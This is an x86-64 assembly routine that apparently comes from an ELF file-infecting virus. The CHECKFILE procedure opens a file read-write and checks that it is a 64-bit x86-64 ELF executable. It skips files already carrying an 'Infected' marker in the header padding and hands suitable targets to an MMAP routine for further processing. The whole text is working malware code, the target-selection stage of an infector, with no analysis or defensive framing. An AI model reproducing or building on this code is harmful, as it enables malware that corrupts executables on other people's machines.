;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ CHECKFILE ]  ; checkfile(pFile, cFile) rsi = pFile, rax = cFile
;//////////////////////////////////////////////////////////////////////////////////////////////////
CHECKFILE:  push           rbp
              mov          rbp,             rsp    

              sub          rsp,             cCHECKVq          ; size for local variable
              
              mov   qword [rbp - pNFile],   rsi               ; save pFileName
              mov   qword [rbp - cNFile],   rax               ; save cFileName
              
              ;/////////////////////////////////////////////////////////////////

              mov          rdi,             rsi
              lea          rsi,            [rbp - pBuffer]
              mov          rax,             SYS_STAT
              syscall

              cmp          rax,             0x00
              jne          CHECK_ERROR
              
              mov          rax,      qword [rsi + 0x30]
              mov   qword [rbp - pSFile],   rax               ; save pFileSize
              
              ;/////////////////////////////////////////////////////////////////
              ;// open File
              ;/////////////////////////////////////////////////////////////////

              mov          rdi,      qword [rbp - pNFile]     ; filename
              mov          rsi,             O_RDWR            ; read and write mode
              mov          rdx,             0                 ; 
              mov          rax,             SYS_OPEN          ; open syscall
              syscall   

              cmp          rax,             0                 ; check if fd in eax > 0 (ok) 
              jl           CHECK_ERROR                        ; cannot open file.  Exit with error status 

              mov   qword [rbp - pHFile],   rax               ; save pFileHandle
           
              ;/////////////////////////////////////////////////////////////////
              ;// read File
              ;/////////////////////////////////////////////////////////////////
           
              mov          rdi,             rax
              lea          rsi,            [rbp - pBuffer]
              mov          rdx,             0x18
              mov          rax,             SYS_READ
              syscall
           
              cmp          rax,             0x00
              jle          FCLOSE2
              
              ;/////////////////////////////////////////////////////////////////
              ;// check if ELF
              ;/////////////////////////////////////////////////////////////////
              
              mov          rdx,             0x01
              
              cmp   dword [rsi],            MAGIC             ; ELF
              jne          FCLOSE2
              
              cmp    word [rsi + 0x09],     0x170A            ; Infected
              je           FCLOSE2
              
              cmp   dword [rsi + 0x04],     0x00010102        ; 64 bit, little endian, original elf, ABI
              jne          FCLOSE2
              
              cmp    word [rsi + 0x12],     0x003E            ; Machinetype
              jne          FCLOSE2
              
              cmp    word [rsi + 0x10],     0x02              ; type
              jl           FCLOSE2

              ;/////////////////////////////////////////////////////////////////
              
              mov          rsi,      qword [rbp - pHFile]        
              mov          rax,      qword [rbp - pSFile]
              
              call         MMAP
              
              mov          rdx,             rax

              ;/////////////////////////////////////////////////////////////////
              ;// Close File
              ;/////////////////////////////////////////////////////////////////

FCLOSE2:      mov          rdi,      qword [rbp - pHFile]
              mov          rax,             SYS_CLOSE
              syscall
              
              jmp          CHECK_READY
              
              ;/////////////////////////////////////////////////////////////////

CHECK_ERROR:  mov          rdx,             0x01
              
              ;/////////////////////////////////////////////////////////////////

CHECK_READY:  mov          rax,             rdx

              mov          rsp,             rbp
            pop            rbp
              ret
